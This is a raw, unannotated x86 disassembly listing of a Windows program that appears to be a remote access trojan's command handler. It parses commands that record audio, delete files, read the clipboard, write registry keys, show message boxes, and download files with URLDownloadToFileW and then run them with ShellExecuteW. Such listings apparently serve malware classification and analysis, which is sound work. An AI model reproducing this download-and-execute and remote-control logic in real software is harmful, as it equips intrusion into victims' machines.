call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x3a4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x1e4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x504 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x204 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x3c4 ]
jmp r-xdata
mov ecx rw-data
call sub_404ad7
jmp r-xdata
mov ecx rw-data
call sub_404be3
jmp r-xdata
xor ebx ebx
lea ecx [ ebp - 0x10 ]
push ebx
call sub_401289
push eax
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
push ebx
mov ecx rw-data
jmp r-xdata
xor ebx ebx
lea ecx [ ebp - 0x10 ]
push ebx
mov [ rw-data ] 0x1
call sub_401289
push eax
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
push 0x1
mov ecx rw-data
call sub_404743
jmp r-xdata
mov esi rw-data
mov ecx esi
call sub_405bfa
push 0x0
mov ecx esi
xor ebx ebx
cmp [ rw-data ] bl
jne r-xdata
lea eax [ ebp - 0x43 ]
lea ecx [ ebp - 0x20 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push r--data
lea eax [ ebp - 0x34 ]
push rw-data
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@PBG@Z
add esp 0xc
lea eax [ ebp - 0x808 ]
lea ecx [ ebp - 0x34 ]
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
call [ FindFirstFileW@IAT ]
cmp eax 0xffffffff
mov [ ebp - 0x24 ] eax
je r-xdata
push 0x1
lea ecx [ ebp - 0x10 ]
call sub_401289
push eax
lea eax [ ebp - 0x544 ]
push eax
call sub_410ee4
pop ecx
pop ecx
push eax
push r--data
lea eax [ ebp - 0x264 ]
push rw-data
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@PBG@Z
add esp 0xc
push eax
lea eax [ ebp - 0x34 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@0@Z
add esp 0xc
lea ecx [ ebp - 0x264 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x544 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea eax [ ebp - 0x37 ]
lea ecx [ ebp - 0x20 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x20 ]
lea ecx [ ebp - 0x34 ]
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
call sub_41156a
pop ecx
test al al
pop ecx
je r-xdata
xor ebx ebx
lea ecx [ ebp - 0x10 ]
push ebx
call sub_401289
push eax
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
mov ecx rw-data
call sub_401fd3
sub esp 0x10
mov esi rw-data
mov edi esp
mov ecx rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
call sub_402032
cmp [ rw-data ] bl
je r-xdata
call [ rw-data ]
mov ecx rw-data
xor ebx ebx
push 0x2
lea ecx [ ebp - 0x10 ]
mov [ rw-data ] bl
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov esi [ atoi@IAT ]
push eax
call esi
pop ecx
push eax
push 0x1
lea ecx [ ebp - 0x10 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call esi
pop ecx
push eax
push ebx
lea ecx [ ebp - 0x10 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call esi
pop ecx
push eax
call sub_4013c9
push [ rw-data ]
mov [ rw-data ] 0x1
call [ waveInStop@IAT ]
push [ rw-data ]
call [ waveInClose@IAT ]
jmp r-xdata
push 0x1
lea ecx [ ebp - 0x10 ]
mov [ rw-data ] 0x1
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
xor ebx ebx
lea ecx [ ebp - 0x10 ]
push ebx
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_409d22
add esp 0x20
lea eax [ ebp - 0x304 ]
push eax
call sub_41184a
sub esp 0xc
mov ecx esp
push eax
push ecx
call sub_410fa4
pop ecx
pop ecx
push 0x33
mov ecx rw-data
call sub_402062
lea ecx [ ebp - 0x304 ]
jmp r-xdata
call sub_401289
push eax
lea eax [ ebp - 0x274 ]
push eax
call sub_410fd0
push eax
lea eax [ ebp - 0x254 ]
push eax
call sub_410f44
mov ecx esp
push eax
push r--data
push ecx
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
push ecx
lea eax [ ebp - 0x3d ]
mov ecx esp
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_410498
add esp 0x20
lea ecx [ ebp - 0x254 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x274 ]
call sub_401289
push eax
lea eax [ ebp - 0x234 ]
push eax
call sub_410fd0
push eax
lea eax [ ebp - 0x214 ]
push eax
call sub_410f44
mov ecx esp
push eax
push r--data
push ecx
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
push ecx
lea eax [ ebp - 0x40 ]
mov ecx esp
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_410498
add esp 0x20
lea ecx [ ebp - 0x214 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x234 ]
jmp r-xdata
lea ecx [ ebp - 0x10 ]
call sub_401289
push eax
lea eax [ ebp - 0x3b4 ]
push eax
call sub_410fd0
push eax
lea eax [ ebp - 0x394 ]
push eax
call sub_410f44
mov ecx esp
push eax
push r--data
push ecx
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
push ecx
lea eax [ ebp - 0x42 ]
mov ecx esp
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_410498
add esp 0x20
lea ecx [ ebp - 0x394 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x3b4 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push ebx
lea ecx [ ebp - 0x10 ]
call sub_401289
push eax
lea eax [ ebp - 0x334 ]
push eax
call sub_410fd0
pop ecx
pop ecx
mov ecx eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::size@IAT ]
push eax
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call sub_4114e1
add esp 0x10
lea ecx [ ebp - 0x334 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push ebx
lea ecx [ ebp - 0x10 ]
call sub_401289
push eax
lea eax [ ebp - 0x374 ]
push eax
call sub_410fd0
push eax
lea eax [ ebp - 0x354 ]
push eax
call sub_410f44
mov ecx esp
push eax
push r--data
push ecx
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
push ecx
lea eax [ ebp - 0x35 ]
mov ecx esp
push eax
push esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_410498
add esp 0x20
lea ecx [ ebp - 0x354 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x374 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push edi
lea eax [ ebp - 0x45 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x58
call sub_4023d9
add esp 0x18
jmp r-xdata
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
call [ DeleteFileW@IAT ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
call sub_411379
pop ecx
jmp r-xdata
sub esp 0x10
lea eax [ ebp - 0x4b4 ]
mov edi esp
push r--data
push esi
push r--data
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
push edi
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
mov ecx rw-data
push 0x59
call sub_402062
lea ecx [ ebp - 0x4b4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub esp 0x10
lea ecx [ ebp - 0x34 ]
mov eax esp
push r--data
push ecx
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@PBG@Z
add esp 0xc
lea ecx [ ebp - 0x10 ]
push ebx
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_402dbf
add esp 0x20
jmp r-xdata
pop ecx
call sub_409cc8
push 0x0
call [ exit@IAT ]
xor ebx ebx
call sub_407af4
jmp r-xdata
xor ebx ebx
xor ebx ebx
push 0x2
lea ecx [ ebp - 0x10 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ atoi@IAT ]
pop ecx
add eax 0x10000
push eax
push 0x1
lea ecx [ ebp - 0x10 ]
call sub_401289
push eax
lea eax [ ebp - 0x134 ]
push eax
call sub_410fd0
pop ecx
pop ecx
mov ecx eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
xor ebx ebx
push eax
push ebx
lea ecx [ ebp - 0x10 ]
call sub_401289
push eax
lea eax [ ebp - 0x114 ]
push eax
call sub_410fd0
pop ecx
pop ecx
mov ecx eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
push ebx
call [ MessageBoxW@IAT ]
lea ecx [ ebp - 0x114 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x134 ]
jmp r-xdata
call sub_40dfa5
xor ebx ebx
push r--data
push ebx
lea ecx [ ebp - 0x10 ]
call sub_401289
mov esi [ std::operator==@IAT ]
push eax
call esi
pop ecx
test al al
pop ecx
je r-xdata
push ebx
call ecx
test eax eax
je r-xdata
push ebx
call ecx
test eax eax
je r-xdata
push ebx
call [ OpenClipboard@IAT ]
test eax eax
je r-xdata
push 0x0
lea ecx [ ebp - 0x10 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
push eax
call sub_405cd4
jmp r-xdata
lea eax [ ebp - 0x24 ]
xor ebx ebx
push eax
lea eax [ ebp + 0x8 ]
push eax
push ebx
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x24 ] ebx
mov [ ebp + 0x8 ] ebx
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call sub_41087e
add esp 0xc
cmp al 0x1
jne r-xdata
call sub_406a9e
jmp r-xdata
push 0x0
lea ecx [ ebp - 0x10 ]
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_40e2f0
jmp r-xdata
push 0x0
lea ecx [ ebp - 0x10 ]
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_40b339
jmp r-xdata
push 0x0
lea ecx [ ebp - 0x10 ]
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_402821
jmp r-xdata
mov edi rw-data
push 0x3
mov ecx edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::size@IAT ]
push eax
mov ecx edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
xor ebx ebx
push eax
push ebx
lea ecx [ ebp - 0x10 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::length@IAT ]
inc eax
lea ecx [ ebp - 0x10 ]
push eax
push ebx
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push r--data
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push 0x80000001
call sub_40a788
add esp 0x20
jmp r-xdata
push 0x0
lea ecx [ ebp - 0x10 ]
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_4093d9
jmp r-xdata
push 0x0
lea ecx [ ebp - 0x10 ]
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_40f908
push r--data
push ebx
lea ecx [ ebp - 0x10 ]
call sub_401289
push eax
call [ std::operator==@IAT ]
pop ecx
test al al
pop ecx
je r-xdata
mov ecx esi
lea edi [ eax + eax ]
call sub_4021b3
test al al
push edi
mov ecx esi
je r-xdata
push r--data
push ebx
lea ecx [ ebp - 0x10 ]
call sub_401289
push eax
call esi
pop ecx
test al al
pop ecx
je r-xdata
push 0x2
lea ecx [ ebp - 0x10 ]
call sub_401289
push eax
lea eax [ ebp - 0x464 ]
push eax
call sub_410fd0
pop ecx
pop ecx
mov ecx eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
push 0x1
lea ecx [ ebp - 0x10 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov al [ eax ]
push eax
lea eax [ ebp - 0x20 ]
push eax
call sub_407cfa
add esp 0xc
lea ecx [ ebp - 0x464 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push ebx
push ebx
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
push 0x3
lea ecx [ ebp - 0x10 ]
call sub_401289
push eax
lea eax [ ebp - 0x144 ]
push eax
call sub_410fd0
pop ecx
pop ecx
mov ecx eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
push ebx
call URLDownloadToFileW
lea ecx [ ebp - 0x144 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push 0x1
push ebx
push ebx
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
push r--data
push ebx
call [ ShellExecuteW@IAT ]
lea ecx [ ebp - 0x20 ]
jmp r-xdata
push r--data
push ebx
lea ecx [ ebp - 0x10 ]
call sub_401289
push eax
call esi
pop ecx
test al al
pop ecx
je r-xdata
push 0x2
lea ecx [ ebp - 0x10 ]
call sub_401289
push eax
lea eax [ ebp - 0x164 ]
push eax
call sub_410fd0
pop ecx
pop ecx
mov ecx eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
push 0x1
lea ecx [ ebp - 0x10 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov al [ eax ]
push eax
lea eax [ ebp - 0x20 ]
push eax
call sub_407cfa
add esp 0xc
lea ecx [ ebp - 0x164 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
push 0x3
lea ecx [ ebp - 0x10 ]
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_4115d9
add esp 0x14
lea ecx [ ebp - 0x20 ]
push 0x1
push ebx
push ebx
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
push r--data
push ebx
call [ ShellExecuteW@IAT ]
lea ecx [ ebp - 0x20 ]
jmp r-xdata
push 0x0
lea ecx [ ebp - 0x10 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ atoi@IAT ]
pop ecx
push eax
call [ ShowWindow@IAT ]
jmp r-xdata
push ebx
lea ecx [ ebp - 0x10 ]
call sub_401289
push eax
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
push 0x2
lea ecx [ ebp - 0x10 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov esi [ atoi@IAT ]
push eax
call esi
test eax eax
pop ecx
setne al
push eax
push 0x1
lea ecx [ ebp - 0x10 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call esi
pop ecx
push eax
call sub_40ecd0
jmp r-xdata
mov ecx rw-data
call sub_402094
call sub_402094
jmp r-xdata
call sub_404743
jmp r-xdata
mov [ rw-data ] bl
jmp r-xdata
push ebx
push ebx
call sub_4069b5
jmp r-xdata
sub esp 0x10
lea eax [ ebp - 0x20 ]
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x5d
mov ecx rw-data
call sub_402062
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x20 ]
lea eax [ ebp - 0x3e ]
push r--data
push eax
lea eax [ ebp - 0x7dc ]
push eax
lea ecx [ ebp - 0x94 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
mov esi [ std::operator!=@IAT ]
push eax
call esi
pop ecx
mov [ ebp + 0xb ] al
pop ecx
lea ecx [ ebp - 0x94 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
xor ebx ebx
cmp [ ebp + 0xb ] bl
je r-xdata
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x34 ]
jmp r-xdata
push 0x1b
mov ecx rw-data
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
cmp [ eax ] 0x1
jne r-xdata
sub esp 0x10
mov ecx esp
push rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x5f
sub esp 0x10
mov ecx esp
push rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x1b
jmp r-xdata
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x598 ]
call j_sub_4020a3
jmp r-xdata
push edi
call closesocket
lea ecx [ ebp - 0x20 ]
jmp r-xdata
lea eax [ ebp - 0x434 ]
push eax
call sub_410fa4
push ecx
push ecx
mov edi esp
push eax
push esi
push 0x2
lea ecx [ ebp - 0x10 ]
call sub_401289
push eax
lea eax [ ebp - 0x414 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
push edi
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
mov ecx rw-data
push 0x55
call sub_402062
lea ecx [ ebp - 0x414 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x434 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x454 ]
push eax
call sub_410f44
push ecx
push ecx
mov ecx esp
push eax
push r--data
push ecx
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
push ecx
lea eax [ ebp - 0x3a ]
mov ecx esp
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_410498
add esp 0x20
lea ecx [ ebp - 0x454 ]
lea eax [ ebp - 0x3f4 ]
push eax
call sub_410f44
push ecx
push ecx
mov ecx esp
push eax
push r--data
push ecx
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
push ecx
lea eax [ ebp - 0x38 ]
mov ecx esp
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_410498
add esp 0x20
lea ecx [ ebp - 0x3f4 ]
jmp r-xdata
test eax eax
setne al
cmp al bl
lea eax [ ebp - 0x20 ]
push eax
je r-xdata
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x74 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x20 ]
jmp r-xdata
call sub_4072cf
jmp r-xdata
push 0x64
call [ Sleep@IAT ]
jmp r-xdata
push 0x1
lea ecx [ ebp - 0x10 ]
call sub_401289
push eax
lea eax [ ebp - 0xb4 ]
push eax
call sub_410fd0
pop ecx
pop ecx
mov ecx eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
push ebx
lea ecx [ ebp - 0x10 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov al [ eax ]
push eax
lea eax [ ebp - 0x20 ]
push eax
call sub_407cfa
add esp 0xc
lea ecx [ ebp - 0xb4 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push ebx
push ebx
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
push 0x2
lea ecx [ ebp - 0x10 ]
call sub_401289
push eax
lea eax [ ebp - 0xd4 ]
push eax
call sub_410fd0
pop ecx
pop ecx
mov ecx eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
push ebx
call URLDownloadToFileW
neg eax
sbb al al
lea ecx [ ebp - 0xd4 ]
inc al
mov [ ebp + 0xb ] al
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
cmp [ ebp + 0xb ] bl
je r-xdata
push 0x64
call [ Sleep@IAT ]
jmp r-xdata
push 0x1
lea ecx [ ebp - 0x10 ]
call sub_401289
push eax
lea eax [ ebp - 0xf4 ]
push eax
call sub_410fd0
pop ecx
pop ecx
mov ecx eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
push ebx
lea ecx [ ebp - 0x10 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov al [ eax ]
push eax
lea eax [ ebp - 0x20 ]
push eax
call sub_407cfa
add esp 0xc
lea ecx [ ebp - 0xf4 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x20 ]
